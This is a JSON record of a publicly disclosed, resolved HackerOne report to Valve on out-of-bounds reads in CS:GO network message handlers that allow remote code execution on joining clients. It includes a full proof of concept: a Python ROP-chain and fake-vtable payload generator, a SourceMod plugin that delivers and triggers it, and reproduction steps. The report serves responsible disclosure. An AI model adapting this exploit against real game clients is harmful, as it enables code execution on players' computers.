{
  "id": 807772,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDc3NzI=",
  "url": "https://hackerone.com/reports/807772",
  "title": "OOB reads in network message handlers leads to RCE",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-02-29T17:19:45.863Z",
  "submitted_at": "2020-02-29T17:19:45.863Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "slidybat",
    "url": "/slidybat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/321/945/c0b45757c343821a68011afe1b229344a41aa9dd_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23363,
    "url": "https://hackerone.com/valve",
    "handle": "valve",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Valve",
      "twitter_handle": "",
      "website": "https://www.valvesoftware.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-05-04T00:25:22.781Z",
  "bug_reporter_agreed_on_going_public_at": "2021-05-01T01:50:09.748Z",
  "team_member_agreed_on_going_public_at": "2021-05-04T00:25:22.612Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Vulnerability\nIn Source engine games there are many network messages sent from the server to the client that take an entity index. There is a common pattern among many of these messages for the lower bounds of the entity index to be checked but not the upper bounds. In many cases these out of bound reads get an entity pointer from that index then call a virtual function on it.\n\nAs an example, here is the handler for the CS:GO [`GlowPropTurnOff`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L444-L446) message:\n\n```cpp\nbool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)\n{\n  CBaseEntity* entity = nullptr;\n\n  int ent_idx = msg->ent_index;\n  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )\n  {\n    CBaseHandle* handle = entitylist[ent_idx]\n    entity = handle->GetBaseEntity();  // A virtual function\n  }\n  \n  // ...\n  \n  return true;\n}\n```\n\n\n# Exploiting the vulnerability\nI will be discussing the `GlowPropTurnOff` message specifically for the remainder of this report, however this OOB read pattern exists in other messages too. I have successfully tested this on a couple of other CS:GO user messages, and while I haven't tested it I also suspect that this bug pattern exists in the network messages of other Source games as well.\n\nThis is the assembly used to access the `entitylist` array:\n```asm\nmov     eax, ent_idx\ntest    eax, eax\njs      short loc_103B77A2\nshl     eax, 4\nmov     ecx, entitylist[eax]\n```\n\nThe index is shifted left by 4 bits (`shl eax, 4`) before being used to access `entitylist`. This means that we can supply a large positive number that will overflow to a negative number, allowing us to return a pointer to pretty much anywhere in the module. Our goal will be to supply an index that returns a pointer to some memory that we control on the client. This memory will have the required vtable set up so that when `handle->GetBaseEntity()` is called it will call an address that we control.\n\nFollowing a writeup of a similar bug (https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf), I chose to use the [`ShowMenu`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L417-L421) message to set up the needed memory on the client. The `ShowMenu` message takes the `menu_string` supplied from the server, converts it to UTF16, and stores it in a global string variable `wchar_t g_szMenuString[512]`.\n\nI wrote the following Python script to generate the payload needed to send through the `ShowMenu` message to set up a fake object with a valid vtable and also includes the ROP chain needed to pop calc:\n```py\nfrom pwn import *\nimport textwrap\n\nBASE_ADDRESS        = 0x287E0000\nFAKE_OBJ            = BASE_ADDRESS + 0x3174F3C\n\nSHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244\n\nGADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1\nGADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C\nGADGET_POP_EAX      = BASE_ADDRESS + 0x4a925\nGADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6\nGADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215\nGADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92\nGADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279\nGADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f\n\ndef to_unicode(dword):\n    a = dword & 0xffff;\n    b = dword >> 16;\n    return eval('u\"\\\\u%s\\\\u%s\"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))\n\ndef write(addr, value):\n    rop = u''\n    rop += to_unicode(GADGET_POP_EAX)\n    rop += to_unicode(addr)\n    rop += to_unicode(GADGET_POP_EDI)\n    rop += to_unicode(value)\n    rop += to_unicode(GADGET_MOV_EAX_EDI)\n    return rop\n\ndef write_deref(addr, to_deref):\n    rop = u''\n    rop += to_unicode(GADGET_POP_EAX)\n    rop += to_unicode(to_deref)\n    rop += to_unicode(GADGET_MOV_EAX_EAX)\n    rop += to_unicode(GADGET_POP_EDI)\n    rop += to_unicode(addr)\n    rop += to_unicode(GADGET_XCHG_EAX_EDI)\n    rop += to_unicode(GADGET_MOV_EAX_EDI)\n    return rop\n\ndef write_zero(addr):\n    rop = u''\n    rop += to_unicode(GADGET_XOR_EAX_EAX)\n    rop += to_unicode(GADGET_POP_EDI)\n    rop += to_unicode(addr)\n    rop += to_unicode(GADGET_XCHG_EAX_EDI)\n    rop += to_unicode(GADGET_MOV_EAX_EDI)\n    return rop\n\ndef stack_pivot(addr):\n    rop = u''\n    rop += to_unicode(GADGET_POP_ESP)\n    rop += to_unicode(addr)\n    return rop\n\nrop = ''\n\nopen_str_addr = FAKE_OBJ + 400\nrop += write(open_str_addr, u32('open'))\n\ncalc_str_addr = FAKE_OBJ + 420\nrop += write(calc_str_addr, u32('calc'))\n\n# Move stack somewhere where it can safely not overwrite our fake object as functions are called\nparams_addr = FAKE_OBJ + 1000000\nrop += write_deref(params_addr, SHELL_EXECUTE_ADDR)\nrop += write(params_addr + 4, 0x41414141)\nrop += write_zero(params_addr + 8)\nrop += write(params_addr + 12, open_str_addr)\nrop += write(params_addr + 16, calc_str_addr)\nrop += write_zero(params_addr + 20)\nrop += write_zero(params_addr + 24)\nrop += write_zero(params_addr + 28)\nrop += stack_pivot(params_addr)\n\n# Fake object structure\n#  0 - pointer to actual object (#1)\n#  1 - pointer to vtable        (#2)\n#  2 - pointer to `pop esp`           <-- start of vtable, and where eax will be pointing once #9 is called\n#  3 - pointer to full stack    (#10) <-- This will move the stack to somewhere where we have more room \n#  4 - junk\n#  5 - junk\n#  6 - junk\n#  7 - junk\n#  8 - junk\n#  9 - ptr to `xchg eax, esp`         <-- address that is initially jumped to, will set esp to #2 so we can pivot stack & begin ROP chain\n# 10 - stack                          <-- where our ROP chain begins\nfakeobj = u''\nfakeobj += '--'\nfakeobj += to_unicode(FAKE_OBJ + 4)\nfakeobj += to_unicode(FAKE_OBJ + 4 * 2)\nfakeobj += to_unicode(GADGET_POP_ESP)\nfakeobj += to_unicode(FAKE_OBJ + 4 * 10)\nfakeobj += u'\\u4141\\u4141'\nfakeobj += u'\\u4242\\u4242'\nfakeobj += u'\\u4343\\u4343'\nfakeobj += u'\\u4444\\u4444'\nfakeobj += u'\\u4545\\u4545'\nfakeobj += to_unicode(GADGET_XCHG_EAX_ESP)\nfakeobj += rop\n\nfakeobj = fakeobj.encode('utf-8')\n\nprint(''.join(['\\\\x%02x' % ord(c) for c in fakeobj]))\n```\n\n*Note*: As in #470520 the script above needs to know the base address of the client's `client_panorama.dll` module in order to be 100% reliable, however it isn't possible to this due to ASLR.\n\nNext, this payload needs to be sent to the client. I did this using the following SourceMod plugin:\n```cpp\n#include <sdktools>\n\npublic void OnPluginStart()\n{\n\tHookEvent( \"player_spawn\", Event_PlayerSpawn );\n}\n\npublic Action Event_PlayerSpawn( Event event, const char[] name, bool dontBroadcast )\n{\n    int client = GetClientOfUserId( event.GetInt( \"userid\" ) );\n\t\n\t{\n\t\tchar payload[] = \"PLACE PAYLOAD HERE\";\n\t\n\t\tProtobuf msg = UserMessageToProtobuf( StartMessageOne( \"ShowMenu\", client ) );\n\t\tmsg.SetInt( \"bits_valid_slots\", 0xFFFFFFFF );\n\t\tmsg.SetInt( \"display_time\", 0 );\n\t\tmsg.SetString( \"menu_string\", payload );\n\t\tEndMessage();\n\t}\n\t\n\t{\n\t\tProtobuf msg = UserMessageToProtobuf( StartMessageOne( \"GlowPropTurnOff\", client ) );\n\t\tmsg.SetInt( \"entidx\", 0xfe43167 );\n\t\tEndMessage();\n\t}\n\n\treturn Plugin_Continue;\n}\n```\n\nOnce a client connects the payload is set up using the `ShowMenu` message and then is triggered immediately after with the `GlowPropTurnOff` message, resulting in calc being popped.\n\n\n# PoC\nHere is a video showcasing the bug being triggered on CS:GO when joining a server:\n{F732616}\n\n\n# Reproduction steps\n1) Start CS:GO and note the base address of `client_panorama.dll`\n2) Replace the value of `BASE_ADDRESS` in the Python script above with this base address value and run the script\n3) Copy the generated payload into the contents of the `payload` string in the SourceMod script above and compile the plugin\n4) Add the compiled plugin to the server and connect to this server with the client, as soon as the client is fully connected calc will be popped automatically\n\n## Impact\n\nThis bug allows an attacker to execute arbitrary code on the computers of any clients that join their server.",
  "bounty_amount": "7500.0",
  "formatted_bounty": "$7,500",
  "weakness": {
    "id": 8,
    "name": "Out-of-bounds Read"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 732616,
      "file_name": "OPWTVDox3r.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2z7yrhSobvFw8Fw1anNnyE19?response-content-disposition=attachment%3B%20filename%3D%22OPWTVDox3r.mp4%22%3B%20filename%2A%3DUTF-8%27%27OPWTVDox3r.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133901Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=65f3edc9d557193266e0ffa5b44cc51bf01c91d3b6fc41cff68fd80c6f29e803",
      "file_size": 2299263,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 205,
  "voters": [
    "d3mondev",
    "pmnh",
    "pretorian",
    "mlucas",
    "taha",
    "superpan",
    "arm4nd0",
    "njbooher",
    "jarij",
    "drsniper",
    "and 195 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 1290,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "*.exe",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
